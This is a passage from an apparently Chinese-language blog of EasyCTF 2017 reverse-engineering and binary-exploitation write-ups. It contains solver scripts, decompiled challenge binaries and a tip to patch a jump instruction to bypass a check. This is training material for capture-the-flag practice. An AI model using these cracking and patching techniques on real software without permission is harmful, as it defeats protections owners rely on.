    b = b * (pp[i] ** int(str(jkx)[i])
</code></pre><p>比如我们输入jkx值为123，那么就会计算b = (<strong>2</strong> ^ <code>1</code>) <em>(<strong>3</strong> ^ <code>2</code>) </em>(<strong>5</strong> ^ <code>3</code>)</p><p>参考ValarDragon表哥的解法<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="comment">#First step:</span></div><div class="line"><span class="comment">#Factor the number</span></div><div class="line">endnum = <span class="number">1165547315017833928671818221519514360217364769512850694972634276966608764777139685632107196533251916113636826873618982702626918260245806732321339626796631711528838400321866758812099562803500967678699400226626798016068690575469938736199168207523212687169370000</span></div><div class="line">primes = filter(<span class="keyword">lambda</span> g: <span class="keyword">not</span> any(g % u == <span class="number">0</span> <span class="keyword">for</span> u <span class="keyword">in</span> range(<span class="number">2</span>, g)), range(<span class="number">2</span>, <span class="number">10000</span>))</div><div class="line">exps = []</div><div class="line"><span class="comment">#get prime factorization</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> primes:</div><div class="line">    k = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span>(endnum % i == <span class="number">0</span>):</div><div class="line">        k+=<span class="number">1</span></div><div class="line">        endnum /= i</div><div class="line">    exps.append(k)</div><div class="line">    <span class="keyword">if</span>(endnum == <span class="number">1</span>):</div><div class="line">        <span class="keyword">break</span></div><div class="line">print(<span class="string">"exponents = %s"</span> %exps)</div><div class="line"><span class="comment">#Factorization obtained</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">floorSqrt</span><span class="params">(n)</span>:</span></div><div class="line">    x = n</div><div class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></div><div class="line">    <span class="keyword">while</span> y &lt; x:</div><div class="line">        x = y</div><div class="line">        y = (x + n // x) // <span class="number">2</span></div><div class="line">    <span class="keyword">return</span> x</div><div class="line"></div><div class="line">jkx2 = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> exps:</div><div class="line">    jkx2 += str(k)</div><div class="line">jkx2 = int(jkx2)</div><div class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</div><div class="line">    breakEarly = <span class="keyword">False</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        jkxapprox = floorSqrt(jkx2)</div><div class="line">        <span class="keyword">assert</span> jkx2 == jkxapprox*(jkxapprox+<span class="number">1</span>)</div><div class="line">        print(<span class="string">"jkx2 = %s"</span> % jkx2)</div><div class="line">        print(<span class="string">"jkx  = %s"</span> % (jkxapprox+<span class="number">1</span>))</div><div class="line">        breakEarly = <span class="keyword">True</span></div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">except</span> AssertionError:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">if</span>(breakEarly):</div><div class="line">        <span class="keyword">break</span></div><div class="line">    jkx2 *= <span class="number">10</span></div></pre></td></tr></table></figure><p></p><h2 id="Lucky-Guess"><a href="#Lucky-Guess" class="headerlink" title="Lucky Guess"></a>Lucky Guess</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>Would you like to play <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/luckyguess/guess" target="_blank" rel="external">a guessing game</a>?</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// rax@8</span></div><div class="line">  __int64 v6; <span class="comment">// rax@10</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax@11</span></div><div class="line">  __int64 v8; <span class="comment">// rax@12</span></div><div class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+0h] [bp-A0h]@1</span></div><div class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+4h] [bp-9Ch]@1</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-98h]@3</span></div><div class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+Ch] [bp-94h]@1</span></div><div class="line">  <span class="keyword">int</span> v13[<span class="number">36</span>]; <span class="comment">// [sp+10h] [bp-90h]@1</span></div><div class="line"></div><div class="line">  primp();</div><div class="line">  qmemcpy(v13, <span class="string">"g"</span>, <span class="number">0x88</span>uLL);</div><div class="line">  v3 = time(<span class="number">0L</span>L);</div><div class="line">  srand(v3);</div><div class="line">  v12 = rand() % <span class="number">0x4000000</span>;</div><div class="line">  v10 = <span class="number">0</span>;</div><div class="line">  v9 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    v7 = v10++;</div><div class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">22</span> )</div><div class="line">    &#123;</div><div class="line">      LODWORD(v8) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">"no dice."</span>);</div><div class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">"Guess? "</span>);</div><div class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v9);</div><div class="line">    <span class="keyword">if</span> ( v9 == v12 )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">if</span> ( v9 &gt;= v12 )</div><div class="line">      v5 = <span class="string">"hi"</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">      v5 = <span class="string">"lo"</span>;</div><div class="line">    LODWORD(v6) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)v5);</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">unsigned</span> __int64)i &lt; <span class="number">0x22</span>; ++i )</div><div class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">char</span>)(v13[i] ^ c610[<span class="number">4</span> * i]));</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="http://i1.piimg.com/589513/73430c431965b22f.png" alt=""></p><p>让<code>if ( v9 == v12 ) break;</code>执行成功跳出<code>while</code>循环，进入<code>for</code>循环得到flag，最简单的方式就是修改<code>jnz</code>指令为<code>nop</code>指令：</p><p><img src="http://i4.buimg.com/589513/91044f6f9469e567.png" alt=""></p><h2 id="Hex-QR"><a href="#Hex-QR" class="headerlink" title="Hex QR"></a>Hex QR</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>I’ve stumbled upon a very <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/qrt/flag.png" target="_blank" rel="external">strange QR code</a>… seems like it was generated with this generator. What could it mean?</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/EasyCTF/easyctf-2017-writeups/blob/master/reverse-engineering/hexqr-200-points.md" target="_blank" rel="external">writeup</a></p><h2 id="67k"><a href="#67k" class="headerlink" title="67k"></a>67k</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/r3ndom-67k/$%7Bbins_zip%7D" target="_blank" rel="external">Here</a> are 67k binaries, well more accurately 67,139 binaries. Solve every single one, append the results together in order (shouldn’t be too difficult as the binaries are numbered) and then from there I’m sure you can figure it out.</p><p>Hint: Maybe write a script.</p><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2017/easyctf/67k.md" target="_blank" rel="external">writeup</a><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> r2pipe</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="comment"># shift arithmetic right copied from http://stackoverflow.com/a/5833119</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rshift</span><span class="params">(val, n)</span>:</span> </div><div class="line">    <span class="keyword">return</span> val&gt;&gt;n <span class="keyword">if</span> val &gt;= <span class="number">0</span> <span class="keyword">else</span> (val+<span class="number">0x100000000</span>)&gt;&gt;n</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">    r2p = r2pipe.open(sys.argv[<span class="number">1</span>])</div><div class="line">    r2p.cmd(<span class="string">"aaa"</span>)</div><div class="line"></div><div class="line">    <span class="comment"># get the name of the function that does the operation</span></div><div class="line">    t = r2p.cmd(<span class="string">"aflj"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    fc_name = d[<span class="number">0</span>][<span class="string">"name"</span>]</div><div class="line">    <span class="keyword">if</span> fc_name == <span class="string">"entry0"</span>:</div><div class="line">        fc_name = d[<span class="number">1</span>][<span class="string">"name"</span>]</div><div class="line"></div><div class="line">    <span class="comment"># determine if sub, add, or xor is used</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@%s"</span> %( fc_name))</div><div class="line">    d = json.loads(t)</div><div class="line">    ins = d[<span class="number">0</span>][<span class="string">"opcode"</span>]</div><div class="line"></div><div class="line">    <span class="comment"># get the value of EAX</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@entry0+0x1f"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    pointer = d[<span class="number">0</span>][<span class="string">"esil"</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</div><div class="line">    pointer = int(pointer, <span class="number">16</span>)</div><div class="line">    t = r2p.cmd(<span class="string">"pxrj 4@%d"</span> % (pointer,))</div><div class="line">    d = json.loads(t)</div><div class="line">    eax = d[<span class="number">0</span>][<span class="string">"value"</span>]</div><div class="line"></div><div class="line">    <span class="comment"># get the value of ECX</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@entry0+0x24"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    ecx = d[<span class="number">0</span>][<span class="string">"opcode"</span>].split()[<span class="number">-1</span>]</div><div class="line">    ecx = int(ecx, <span class="number">16</span>)</div><div class="line"></div><div class="line">    <span class="comment"># determine the operation used by do_foo()</span></div><div class="line">    answer = <span class="number">0</span></div><div class="line">    <span class="keyword">if</span> <span class="string">"sub"</span> <span class="keyword">in</span> ins:</div><div class="line">        answer = eax - ecx</div><div class="line">    <span class="keyword">elif</span> <span class="string">"xor"</span> <span class="keyword">in</span> ins:</div><div class="line">        answer = eax ^ ecx</div><div class="line">    <span class="keyword">elif</span> <span class="string">"add"</span> <span class="keyword">in</span> ins:</div><div class="line">        answer = eax + ecx</div><div class="line"></div><div class="line">    <span class="comment"># get value to use for SAR operation</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@entry0+0x36"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    pointer = d[<span class="number">0</span>][<span class="string">"esil"</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</div><div class="line">    pointer = int(pointer, <span class="number">16</span>)</div><div class="line"></div><div class="line">    t = r2p.cmd(<span class="string">"pxrj 4@%d"</span> % (pointer,))</div><div class="line">    t = t.replace(<span class="string">"\\x"</span>, <span class="string">""</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    val = d[<span class="number">0</span>][<span class="string">"value"</span>]</div><div class="line">    cl = val &amp; <span class="number">0xFF</span></div><div class="line"></div><div class="line">    <span class="comment"># get the solution to the challenge</span></div><div class="line">    solve = rshift(answer, cl)</div><div class="line">    solve = solve &amp; <span class="number">0xff</span></div><div class="line">    sys.stdout.write(<span class="string">"%c"</span> % (solve,))</div></pre></td></tr></table></figure><p></p><h2 id="Heaps-of-Knowledge"><a href="#Heaps-of-Knowledge" class="headerlink" title="Heaps of Knowledge"></a>Heaps of Knowledge</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>Can you pwn this? Navigate to <code>/problems/heaps_of_knowledge/</code> on the shell server and read <code>flag.txt</code>.</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/heaps_of_knowledge/heaps_of_knowledge" target="_blank" rel="external">Binary</a></p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2017/easyctf/heaps-of-knowledge.md" target="_blank" rel="external">writeup</a></p><h2 id="Morphin"><a href="#Morphin" class="headerlink" title="Morphin"></a>Morphin</h2><p>Welcome to the RE training course, this problem has 4 phases. Solve all four to get the flag.</p><p>Note: On phase 1 round to 6 significant figures.</p><p>Download</p><p><a href="https://writeups.easyctf.com/reverse-engineering.html" target="_blank" rel="external">writeup</a></p><h1 id="0x07-Binary-Exploitation"><a href="#0x07-Binary-Exploitation" class="headerlink" title="0x07 Binary Exploitation"></a>0x07 Binary Exploitation</h1><h2 id="Risky-Business"><a href="#Risky-Business" class="headerlink" title="Risky Business"></a>Risky Business</h2><h3 id="problem-8"><a href="#problem-8" class="headerlink" title="problem"></a>problem</h3><p>We wanted to branch into the casino business, but human employees are too expensive so we decided to automate it. I feel like we missed something obvious though… Oh well! Here’s the binary: <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/risky-business/casino" target="_blank" rel="external">casino</a></p><p>Solve this problem by logging into the shell server and navigating to <code>/problems/casino</code>.<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 v3; <span class="comment">// rax@1</span></div><div class="line">  __int64 v4; <span class="comment">// rdx@1</span></div><div class="line">  __int64 v5; <span class="comment">// rax@1</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx@2</span></div><div class="line">  __int64 v7; <span class="comment">// rdx@2</span></div><div class="line">  __int64 v8; <span class="comment">// rax@2</span></div><div class="line">  __int64 v9; <span class="comment">// rax@2</span></div><div class="line">  __int64 v10; <span class="comment">// rdi@2</span></div><div class="line">  __int64 v11; <span class="comment">// rdx@2</span></div><div class="line">  __int64 v13; <span class="comment">// rax@4</span></div><div class="line">  <span class="keyword">int</span> v14; <span class="comment">// eax@4</span></div><div class="line">  __int64 v15; <span class="comment">// rdx@4</span></div><div class="line">  <span class="keyword">bool</span> v16; <span class="comment">// al@6</span></div><div class="line">  __int64 v17; <span class="comment">// rax@11</span></div><div class="line">  __int64 v18; <span class="comment">// rax@13</span></div><div class="line">  __int64 v19; <span class="comment">// rdx@14</span></div><div class="line">  __int64 v20; <span class="comment">// rax@15</span></div><div class="line">  __int64 v21; <span class="comment">// rax@16</span></div><div class="line">  <span class="keyword">int</span> v22; <span class="comment">// [sp+Ch] [bp-1C4h]@4</span></div><div class="line">  <span class="keyword">char</span> v23; <span class="comment">// [sp+10h] [bp-1C0h]@4</span></div><div class="line">  <span class="keyword">char</span> v24; <span class="comment">// [sp+30h] [bp-1A0h]@4</span></div><div class="line">  __int64 v25; <span class="comment">// [sp+B0h] [bp-120h]@4</span></div><div class="line">  __int64 v26; <span class="comment">// [sp+1B8h] [bp-18h]@1</span></div><div class="line"></div><div class="line">  v26 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  LODWORD(v3) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Welcome to the EasyCTF 2017 Casino"</span>, envp);</div><div class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  LODWORD(v5) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</div><div class="line">                  &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</div><div class="line">                  <span class="string">"Try your luck and gain access to our exclusive club!"</span>,</div><div class="line">                  v4);</div><div class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    v6 = networth;</div><div class="line">    LODWORD(v8) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Your net worth is: $"</span>, v7);</div><div class="line">    LODWORD(v9) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6);</div><div class="line">    v10 = v9;</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    <span class="keyword">if</span> ( networth &gt; <span class="number">2000000000</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    LODWORD(v13) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</div><div class="line">                     &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</div><div class="line">                     <span class="string">"Please enter how much you would like to bet:"</span>,</div><div class="line">                     v11);</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v23);</div><div class="line">    <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;_TMC_END__, &amp;v23);</div><div class="line">    v14 = <span class="built_in">std</span>::<span class="keyword">operator</span>|(<span class="number">16L</span>L, <span class="number">8L</span>L);</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_stringstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_stringstream(</div><div class="line">      &amp;v24,</div><div class="line">      &amp;v23,</div><div class="line">      (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v14);</div><div class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;v24, &amp;v22);</div><div class="line">    v16 = (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::eof(&amp;v25) ^ <span class="number">1</span></div><div class="line">       || (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::fail(&amp;v25);</div><div class="line">    <span class="keyword">if</span> ( v16 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"That was not a valid number :("</span>, v15);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v22 &gt; <span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( v22 &lt;= <span class="number">100000000</span> )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)gamble() ^ <span class="number">1</span> )</div><div class="line">        &#123;</div><div class="line">          LODWORD(v20) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Sorry, I'm afraid you've lost :("</span>, v19);</div><div class="line">          <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">          networth -= v22;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">          LODWORD(v21) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Congratulations, you won!"</span>, v19);</div><div class="line">          <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v21, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">          networth += v22;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span></div><div class="line">      &#123;</div><div class="line">        LODWORD(v18) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</div><div class="line">                         &amp;<span class="built_in">std</span>::<span 